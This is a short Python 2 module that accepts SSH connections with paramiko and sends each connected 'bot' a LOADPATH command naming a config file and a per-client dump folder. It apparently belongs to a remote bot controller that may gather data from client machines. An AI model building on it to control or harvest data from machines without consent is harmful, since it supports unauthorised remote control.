from ParamikoServer import Server
from paramiko import Transport
from paramiko import  RSAKey
import ChannelSSH
from time import  time
host_key = RSAKey(filename='./rsa.key')
path_destination = "bot/dump/"
path_source = "bot/fichi.cnf"
class Client():

    def __init__(self, sock, addr):
        self.socket = sock
        self.address = addr
        self.closed = False
        self.tags = str(time())
        try:
            self.transport = Transport(sock)
        except Exception:
            pass
        self.chan = None

    def initialise_bot(self):
        try:
            ChannelSSH.sendToChannel("**LOADPATH**;"+path_destination+""+self.getAddr()+""+self.tags+";"+path_source,self.chan)
        except Exception, e:
            print "Initialisation of path: " + str(e)
    def connect(self):
        try:
            self.transport.load_server_moduli()
            self.transport.add_server_key(host_key)
            server = Server()
            self.transport.start_server(server=server)
            self.chan = self.transport.accept(100)
        except Exception, e:
            print "Connection parmiko :"+str(e)

    def get_channel(self):
        return self.chan

    def getAddr(self):
        return self.address[0]

    def isclosed(self):
        return self.closed
    def getScock(self):
        return self.socket

    def close(self):
        try:
            self.closed = True
            self.socket.close()
        except Exception:
            pass

    def toclose(self):
        self.closed = True
